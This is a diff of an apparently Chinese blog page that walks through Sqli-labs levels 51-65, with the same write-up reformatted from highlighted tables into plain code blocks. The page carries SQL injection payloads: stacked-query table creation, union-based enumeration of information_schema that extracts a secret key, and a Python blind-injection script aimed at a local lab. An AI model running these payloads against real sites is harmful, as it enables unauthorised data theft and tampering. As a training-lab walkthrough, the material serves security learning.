@@ -12,7 +12,8 @@
     <meta name="keywords" content="TriDiamond Obsidian,"> 
     <meta name="description" content="前一部分链接：第41-50关Write-up
 Less-51与前一关相同，单引号包裹，payload
-1?sort=1&amp;apos;;create table less51 like users--+,"> 
+?sort=1&amp;#39;;create table less51 like users--+
+L,"> 
     <meta name="author" content="Knlvre"> 
     <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
     <link rel="icon" href="knlvre.github.io/img/favicon.png"> 
@@ -86,13 +87,13 @@ Less-51与前一关相同，单引号包裹，payload
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    9.3k
+                    4.2k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    8 mins.
+                    4 mins.
                 </span>
                 
                 
@@ -128,32 +129,77 @@ Less-51与前一关相同，单引号包裹，payload
         <div class="content markdown animated fadeIn">
             <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/02/Sqli-labs%20%E7%AC%AC41-50%E5%85%B3/">第41-50关Write-up</a></p>
 <h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>与前一关相同，单引号包裹，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos;;create table less51 like users--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>与Less-50相同，只不过没有报错信息回显，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table less51 like users--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>与Less-51相同，只不过没有报错信息回显，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos;;create table less51 like users--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>本关开始，又有了新类型的题目了</p>
+<pre><code>?sort=1&#39;;create table less51 like users--+
+</code></pre><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>与Less-50相同，只不过没有报错信息回显，payload</p>
+<pre><code>?sort=1;create table less51 like users--+
+</code></pre><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>与Less-51相同，只不过没有报错信息回显，payload</p>
+<pre><code>?sort=1&#39;;create table less51 like users--+
+</code></pre><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>本关开始，又有了新类型的题目了</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/51-65/4-1.png" alt="4-1"></p>
 <p>题目要求注出<code>secret key</code>，并且提交的次数有十次的限制，本关就先一次一次记录一下：</p>
 <p>①发现单引号包裹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=2&apos; or 1=1 --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:Dumb；Your Password:Dumb</span><br></pre></td></tr></table></figure>
-<p>②union联合查询成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:3</span><br></pre></td></tr></table></figure>
-<p>③查询表名成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:c4ukmmeokq</span><br></pre></td></tr></table></figure>
-<p>④查询列名成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;c4ukmmeokq&quot; --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:id,sessid,secret_SAT4,tryy</span><br></pre></td></tr></table></figure>
-<p>⑤获取密钥</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,secret_SAT4 from c4ukmmeokq --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:BlKuhIw2XDbdZWwN6f2W1cTm</span><br></pre></td></tr></table></figure>
-<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>与前一关一样，参数用<code>括号</code>包裹，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注表名</span><br><span class="line">?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">#注列名</span><br><span class="line">?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;jzxlk3kxz9&quot; --+</span><br><span class="line"></span><br><span class="line">#注密钥</span><br><span class="line">?id=-1) union select 1,2,secret_NGS3 from jzxlk3kxz9 --+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>与前一关一样，参数用<code>单引号+括号</code>包裹，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注表名</span><br><span class="line">?id=-1&apos;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">#注列名</span><br><span class="line">?id=-1&apos;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;0p9yfnr8tk&quot; --+</span><br><span class="line"></span><br><span class="line">#注密钥</span><br><span class="line">?id=-1&apos;) union select 1,2,secret_8QJV from 0p9yfnr8tk --+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>与前一关一样，参数用<code>双引号</code>包裹，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注表名</span><br><span class="line">?id=-1&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">#注列名</span><br><span class="line">?id=-1&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;5w2mz645f4&quot; --+</span><br><span class="line"></span><br><span class="line">#注密钥</span><br><span class="line">?id=-1&quot; union select 1,2,secret_HD9O from 5w2mz645f4 --+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p><code>单引号</code>包裹，盲注，python代码只注数据库，不再多谢赘述</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/AAsqli-labs/Less-58/?id=1' and ascii(substr(database(),&#123;&#125;,1))=&#123;&#125; --+"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">125</span>):</span><br><span class="line">        payload = url.format(i,j)</span><br><span class="line">        r = requests.get(payload)</span><br><span class="line">        soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">        match = re.findall(<span class="string">"Angelina"</span>,str(soup))</span><br><span class="line">        <span class="keyword">if</span>(match):</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>
+<pre><code>?id=2&#39; or 1=1 --+
+
+回显：Your Login name:Dumb；Your Password:Dumb
+</code></pre><p>②union联合查询成功</p>
+<pre><code>?id=-1&#39; union select 1,2,3 --+
+
+回显：Your Login name:2;Your Password:3
+</code></pre><p>③查询表名成功</p>
+<pre><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+
+回显：Your Login name:2;Your Password:c4ukmmeokq
+</code></pre><p>④查询列名成功</p>
+<pre><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;c4ukmmeokq&quot; --+
+
+回显：Your Login name:2;Your Password:id,sessid,secret_SAT4,tryy
+</code></pre><p>⑤获取密钥</p>
+<pre><code>?id=-1&#39; union select 1,2,secret_SAT4 from c4ukmmeokq --+
+
+回显：Your Login name:2;Your Password:BlKuhIw2XDbdZWwN6f2W1cTm
+</code></pre><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>与前一关一样，参数用<code>括号</code>包裹，payload</p>
+<pre><code>#注表名
+?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+
+#注列名
+?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;jzxlk3kxz9&quot; --+
+
+#注密钥
+?id=-1) union select 1,2,secret_NGS3 from jzxlk3kxz9 --+
+</code></pre><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>与前一关一样，参数用<code>单引号+括号</code>包裹，payload</p>
+<pre><code>#注表名
+?id=-1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+
+#注列名
+?id=-1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;0p9yfnr8tk&quot; --+
+
+#注密钥
+?id=-1&#39;) union select 1,2,secret_8QJV from 0p9yfnr8tk --+
+</code></pre><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>与前一关一样，参数用<code>双引号</code>包裹，payload</p>
+<pre><code>#注表名
+?id=-1&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+
+#注列名
+?id=-1&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;5w2mz645f4&quot; --+
+
+#注密钥
+?id=-1&quot; union select 1,2,secret_HD9O from 5w2mz645f4 --+
+</code></pre><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p><code>单引号</code>包裹，盲注，python代码只注数据库，不再多谢赘述</p>
+<pre><code class="python">from bs4 import BeautifulSoup
+import requests,re
+
+url = &quot;http://127.0.0.1/AAsqli-labs/Less-58/?id=1&#39; and ascii(substr(database(),{},1))={} --+&quot;
+flag = &quot;&quot;
+for i in range(1,10):
+    for j in range(95,125):
+        payload = url.format(i,j)
+        r = requests.get(payload)
+        soup = BeautifulSoup(r.text,&#39;lxml&#39;)
+        match = re.findall(&quot;Angelina&quot;,str(soup))
+        if(match):
+            flag = flag + chr(j)
+            print(flag)
+</code></pre>
 <h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>与前一关差不多，只不过没有参数没有包裹，<code>整形注入</code></p>
 <h2 id="Less-60-65"><a href="#Less-60-65" class="headerlink" title="Less-60-65"></a>Less-60-65</h2><p>类型都差不多，就不再详细讲解了</p>
 
